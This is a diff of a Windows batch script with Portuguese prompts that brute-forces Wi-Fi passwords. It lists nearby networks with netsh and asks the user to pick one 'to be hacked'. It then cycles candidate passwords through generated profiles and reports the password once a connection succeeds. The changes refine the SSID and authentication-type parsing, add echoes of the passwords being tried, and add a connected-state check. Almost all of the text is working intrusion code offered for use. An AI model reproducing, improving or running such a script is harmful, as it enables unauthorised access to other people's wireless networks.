@@ -6,14 +6,19 @@ echo.
 pause
 cls
 netsh wlan show networks bssid | findstr "SSID Autentica" | findstr /v "BSSID">o
-type o | find "SSID" | find /n ":">u 
-type o | find "Autentica" | find /n ":">i
+
 echo [0] Todos
-type u
+for	/f "usebackq tokens=*" %%a in (`type o ^| find "SSID" ^| find /n ":"`) do (
+	echo %%a
+)
+
 echo.
 set /p bf="Na lista acima, escolha um numero do Wifi para ser hackeada: "
 
 :allwifi
+del /f /q connectStatus
+del /f /q Wi-Fi*
+cls
 set senhaanterior=1234
 set num=1
 echo %bf%
@@ -23,31 +28,39 @@ if "%bf%" EQU "0" (
 if %all% EQU "True" (
 	set /a bf=%bf%+1
 )
+for	/f "usebackq tokens=*" %%g in (`type o ^| find "SSID" ^| find /n ":"`) do (
+	for /f "usebackq tokens=1,2* delims=:" %%a in (`echo %%g ^| find "[%bf%]"`) do (
+		for /f "tokens=1* delims= " %%e in ("%%b") do (
+			if "%%f" EQU "" (
+				set select=%%e
+			)else (
+				for /f "tokens=1,2* delims= " %%m in ("%%f") do (
+					if "%%n" EQU "" (
+						set select=%%e %%m
+					)else (
+						set select=%%e %%m %%n
+					)
+				)
+			)
 
-for /f "tokens=1,2* delims=:" %%a in ('find "[%bf%]" u') do (
-	for /f "tokens=1* delims= " %%e in ("%%b") do (
-		if "%%f" EQU "" (
-			set select=%%e
-		)else (
-			set select=%%e %%f
 		)
-
 	)
 )
 
-for /f "tokens=1,2 delims=:" %%a in ('find "[%bf%]" i') do (
-	
-	for /f "tokens=1,2 delims= " %%e in ("%%b") do (
-		for /f "tokens=1,2 delims=-" %%m in ("%%e") do (
-			if %%m EQU Abrir ( 
-				if %all% EQU "True" (
-					goto allwifi
+for	/f "usebackq tokens=*" %%g in (`type o ^| find "Autentica" ^| find /n ":"`) do (
+	for /f "usebackq tokens=1,2* delims=:" %%a in (`echo %%g ^| find "[%bf%]"`) do (
+		for /f "tokens=1,2 delims= " %%e in ("%%b") do (
+			for /f "tokens=1,2 delims=-" %%m in ("%%e") do (
+				if %%m EQU Abrir ( 
+					if %all% EQU "True" (
+						goto allwifi
+					)
+					echo Rede Aberta
+					pause
+					exit
+				)else (
+					set tipo=%%m
 				)
-				echo Rede Aberta
-				pause
-				exit
-			)else (
-				set tipo=%%m
 			)
 		)
 	)
@@ -108,6 +121,8 @@ netsh wlan show interfaces | find "Estado">connectStatus
 for /f "tokens=1* delims=:" %%d in (connectStatus) do (
 	for /f "tokens=1* delims= " %%m in ("%%e") do (
 		echo %%m
+		echo %senhaatual%
+		echo %senhaanterior%
 		if %%m EQU associando (
 			echo Quase la... Relaxa....
 			goto autenticando
@@ -141,7 +156,8 @@ for /f "tokens=1* delims=:" %%d in (connectStatus) do (
 				)
 				goto nadaencontrado
 			)
-		)else (
+		)
+		if %%m EQU Conectado (
 			echo Acesso Permitido
 			goto fim
 		)
@@ -157,10 +173,7 @@ echo.
 echo Senha de acesso: %senha%
 :nadaencontrado
 del /f /q connectStatus
-del /f /q a
 del /f /q o
-del /f /q u
-del /f /q i
 del /f /q "Wi-Fi-%select%.xml"
 echo.
 echo.
